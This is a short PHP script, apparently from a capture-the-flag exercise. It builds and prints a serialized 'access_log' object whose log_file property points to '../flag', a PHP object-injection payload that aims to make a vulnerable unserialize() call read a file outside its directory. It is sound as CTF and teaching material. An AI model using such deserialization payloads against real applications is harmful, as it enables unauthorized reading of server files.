<?php 
// echo password_hash("123", PASSWORD_BCRYPT);
class access_log {
    public $log_file = "../flag";
}
$obj = new access_log();
echo serialize($obj);
?>